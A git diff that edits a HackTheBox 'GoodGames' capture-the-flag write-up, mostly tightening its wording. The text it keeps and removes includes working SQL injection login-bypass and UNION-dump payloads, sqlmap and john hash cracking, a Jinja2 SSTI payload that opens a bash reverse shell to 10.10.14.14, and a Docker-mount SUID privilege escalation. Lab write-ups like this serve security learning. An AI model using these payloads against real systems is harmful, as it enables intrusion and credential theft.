@@ -48,7 +48,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 26.23 seconds
 ```
 
-It seems like there’s only port 80 open. Lets check their website out.
+Here is their website out.
 
 ![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/website.png?raw=true)
 
@@ -75,9 +75,7 @@ Lets use `dirb` to check if we missed out anything hidden.
 -----------------
 ```
 
-Seems like we didn’t miss out anything important. 
-
-Lets go back to the login page and register a new account!
+Seems like we didn’t miss out anything important. Lets go back to the login page and register a new account.
 
 ![login_shiro](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/login_shiro.png?raw=true)
 
@@ -102,9 +100,7 @@ Any attempts to edit the profile details results in `500 INTERNAL SERVER ERROR`.
 
 ![error](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/error.png?raw=true)
 
-It seems that we might be on the wrong path.
-
-At this point, I had to rethink my steps again and try some low hanging fruit such as SQL injection on the login page.
+It seems that we might be on the wrong path. At this point, we might as well try some low hanging fruit such as SQL injection on the login page.
 
 Trying `’or1=1--` failed but `’or1=1-- -` succeeded!
 
@@ -144,9 +140,7 @@ Upgrade-Insecure-Requests: 1
 
 ![admin_profile](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/admin_profile.png?raw=true)
 
-The only important information that we have here is `admin@goodgames.htb`. We need to find out more.
-
-Lets use SQL injection (`UNION SELECT`) to find out the number of columns in the database.
+The only important information that we have here is `admin@goodgames.htb`. We need to find out more. Lets use SQL injection (`UNION SELECT`) to find out the number of columns in the database.
 
 ```http
 - REQUEST -
@@ -160,7 +154,7 @@ email=%27+union+select+1%2c2%2c3%2c4--+-&password=
 ...
 ```
 
->   ' union select 1,2,3,4-- -
+>   `' union select 1,2,3,4-- -`
 
 There’s 4 columns in the database. Now lets get the database name.
 
@@ -176,7 +170,7 @@ email=%27+union+select+1%2c2%2c3%2cdatabase%28%29--+-&password=
 ...
 ```
 
->   ' union select 1,2,3,database()-- -
+>   `' union select 1,2,3,database()-- -`
 
 Now lets view the tables in `main`.
 
@@ -192,7 +186,7 @@ email=%27+union+select+1%2c2%2c3%2cconcat%28table_name%2c+%22%2f%22%29+from+info
 ...
 ```
 
->   ' union select 1,2,3,concat(table_name, "/") from information_schema.tables where table_schema = 'main'-- -
+>   `' union select 1,2,3,concat(table_name, "/") from information_schema.tables where table_schema = 'main'-- -`
 
 The column we are interested in is `user`, so lets view that.
 
@@ -208,7 +202,7 @@ email=%27+union+select+1%2c2%2c3%2cconcat%28column_name%2c+%22%2f%22%29+from+inf
 ...
 ```
 
->   ' union select 1,2,3,concat(column_name, "/") from information_schema.columns where table_schema = 'main' and table_name = 'user'-- -
+>   `' union select 1,2,3,concat(column_name, "/") from information_schema.columns where table_schema = 'main' and table_name = 'user'-- -`
 
 Finally, lets view the users in the table.
 
@@ -225,26 +219,18 @@ email=%27+union+select+1%2c2%2c3%2cconcat%28column_name%2c+%22%2f%22%29+from+inf
 ...
 ```
 
->   ' union select 1,2,3,concat(id, ":", name, ":", email, ":", password) from user-- -
+>   `' union select 1,2,3,concat(id, ":", name, ":", email, ":", password) from user-- -`
 
-### Sqlmap Method
+### `sqlmap` Method
 
-Instead of manually testing for SQL injection, we can just use `sqlmap`! OwO
+Instead of manually testing for SQL injection, we can just use `sqlmap`!
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
 └─# cat login_request.txt
 POST /login HTTP/1.1
 Host: 10.10.11.130
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 32
-Origin: http://10.10.11.130
-Connection: close
-Referer: http://10.10.11.130/login
+...
 Upgrade-Insecure-Requests: 1
 
 email=shiro&password=password
@@ -252,8 +238,6 @@ email=shiro&password=password
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
 └─# sqlmap -r login_request.txt --batch            
 ...
-POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 146 HTTP(s) requests:
 ---
 Parameter: email (POST)
     Type: time-based blind
@@ -266,8 +250,6 @@ Parameter: email (POST)
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
 └─# sqlmap -r login_request.txt --batch --dbs
 ...
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
-2
 [19:40:57] [INFO] retrieved: 
 [19:41:02] [INFO] adjusting time delay to 1 second due to good response times
 information_schema
@@ -280,9 +262,6 @@ available databases [2]:
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
 └─# sqlmap -r login_request.txt --batch -D main --tables
 ...
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
-[19:44:36] [INFO] adjusting time delay to 1 second due to good response times
-3
 [19:44:36] [INFO] retrieved: blog
 [19:44:51] [INFO] retrieved: blog_comments
 [19:45:28] [INFO] retrieved: user
@@ -298,9 +277,6 @@ Database: main
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
 └─# sqlmap -r login_request.txt --batch -D main -T user --dump
 ...
-do you want to use common password suffixes? (slow!) [y/N] N
-[19:54:31] [INFO] starting dictionary-based cracking (md5_generic_passwd)
-[19:54:31] [INFO] starting 4 processes 
 [19:54:36] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                            
 Database: main                                                                                                       
 Table: user
@@ -314,7 +290,7 @@ Table: user
 ...
 ```
 
-Awesome~ We have the admin password hash! Lets identify the hash and try to brute-force it.
+We have the admin password hash! Lets identify the hash and try to brute-force it.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
@@ -327,10 +303,6 @@ Possible Hashs:
 [+] MD5
 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
 ...
-
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
-└─# cat hash.txt
-2b22337f218b2d82dfc3b6f77e7cb8ec
                                              
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
 └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt -format=Raw-MD5
@@ -339,26 +311,16 @@ superadministrator (?)
 ...
 ```
 
-Yay~ We found the password `superadministrator`.
+We found the password `superadministrator`.
 
-At the top right of the admin’s profile page, we can find another hidden login page by clicking on the gear icon.
-
-However, to access this website, we have to add the subdomain to our `/etc/hosts` file.
+At the top right of the admin’s profile page, we can find another hidden login page by clicking on the gear icon. However, to access this website, we have to add the subdomain to our `/etc/hosts` file.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
 └─# cat /etc/hosts
-127.0.0.1	localhost
-127.0.1.1	shiro.shiro	shiro
-10.10.10.48     mirai.htb
-10.10.10.13     cronos.htb ns1.cronos.htb admin.cronos.htb
-10.10.10.22	europa.htb www.europacorp.htb admin-portal.europacorp.htb
+...
 10.10.11.130	goodgames.htb internal-administration.goodgames.htb
-
-# The following lines are desirable for IPv6 capable hosts
-::1     localhost ip6-localhost ip6-loopback
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
+...
 ```
 
 ![internal_login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/internal_login.png?raw=true)
@@ -390,21 +352,19 @@ Content-Length: 32559
 ...
 ```
 
-Looking at the response, the site seems to be running on Python.
-
-Since the website is running on a Python server, we can test for Server Side Template Injection (SSTI)!
+Looking at the response, the site seems to be running on Python. Since the website is running on a Python server, we can test for Server Side Template Injection (SSTI)!
 
 For this challenge, I tried using `{{0 + 1}}` as a payload for the `Full Name` input.
 
 ![ssti_test](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/ssti_test.png?raw=true)
 
-Nice~ The name was updated to the expected output - `1`!
+The name was updated to the expected output - `1`!
 
 [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) showed that we can exploit the SSTI by calling `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`.
 
 ![ssti_id](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/ssti_id.png?raw=true)
 
-Nice! it works. Now, we can just change the `id` portion of the payload to a reverse shell code.
+Now, we can just change the `id` portion of the payload to a reverse shell code.
 
 ```python
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "exec bash -i &>/dev/tcp/10.10.14.14/1234 <&1"').read() }}
@@ -431,7 +391,7 @@ drwxr-xr-x 1 root root 4096 Nov  3  2021 project
 -rw-r--r-- 1 root root  208 Nov  3  2021 requirements.txt
 ```
 
->   This was a Docker container OwO
+>   This was a Docker container.
 
 # Privilege Escalation
 
@@ -510,11 +470,6 @@ ip addr
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
 └─# wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
 
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
-└─# python3 -m http.server 80  
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.11.130 - - [15/Aug/2022 20:52:20] "GET /nmap HTTP/1.1" 200 -
-
 - Netcat Listener -
 root@3a453ab39d3d:/home/augustus# wget http://10.10.14.14/nmap
 root@3a453ab39d3d:/home/augustus# chmod +x nmap
@@ -584,9 +539,7 @@ lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
 -rw-r----- 1 root     augustus      33 Aug 15 14:10 user.txt
 ```
 
-Recall that we used the docker container to grab `nmap` from our own server? It shows that it is owned by `root`. 
-
-Perhaps we can copy `/bin/bash` to our current actual directory and then use the docker container to assign it with root privileges + SUID bit set?
+Recall that we used the docker container to grab `nmap` from our own server? It shows that it is owned by `root`. Perhaps we can copy `/bin/bash` to our current actual directory and then use the docker container to assign it with root privileges + SUID bit set?
 
 ```bash
 augustus@GoodGames:~$ cp /bin/bash .
